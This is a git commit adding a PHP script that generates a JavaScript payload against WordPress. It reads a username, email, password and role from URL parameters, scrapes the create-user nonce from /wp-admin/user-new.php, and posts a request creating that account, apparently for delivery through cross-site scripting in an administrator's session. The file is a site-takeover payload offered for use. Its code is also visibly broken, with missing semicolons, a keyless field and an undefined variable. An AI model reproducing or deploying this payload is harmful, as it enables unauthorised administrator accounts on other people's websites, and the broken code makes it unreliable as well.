aa55f2268a3fcd905320e7942acdf77ebef1b896
GinoRossiAr <63261677+GinoRossiAr@users.noreply.github.com>
2022-09-18 12:31:01 -0300

    Add files via upload

---
+++ script.php
@@ -0,0 +1,9 @@
+<?php
+$usuario = $_GET['usuario'];
+$mail = $_GET['mail'];
+$pass = $_GET['password']
+$rol = $_GET['rol']
+
+?>
+
+u="/wp-admin/user-new.php";jQuery.get(u,function(e){jQuery.post(u,{action:"createuser","_wpnonce_create-user":e.match(/_wpnonce_create-user\"\svalue=\"(.+?)\"/)[1],user_login:"<?php echo $usuario; ?>",email:"<?php echo $mail; ?>",pass1:"<?php echo $pass; ?>","<?php echo $pass2; ?>",role:"<?php echo $rol; ?>"})});
